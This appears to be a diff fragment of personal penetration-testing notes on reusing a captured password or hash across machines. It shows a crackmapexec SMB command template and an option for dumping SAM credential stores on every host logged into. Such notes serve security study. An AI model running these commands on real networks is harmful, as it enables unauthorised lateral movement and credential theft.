@@ -2,8 +2,8 @@ what are we doing?
 	we are taking the password that we already got, and we are passing it around to different machines and trying to use that to login
 
 tool
-	crackmapexec 
-		smb <ip/ip range> -u <username> -d <domain> -p <Password> -H <hash> --local-auth (what authentication mechanism are we using? )
+```
+crackmapexec smb <ip/ip range> -u <username> -d <domain> -p <Password> -H <hash> --local-auth (what authentication mechanism are we using? )
 		-sam 
 			we can dump the sam on every device we login to
 				example
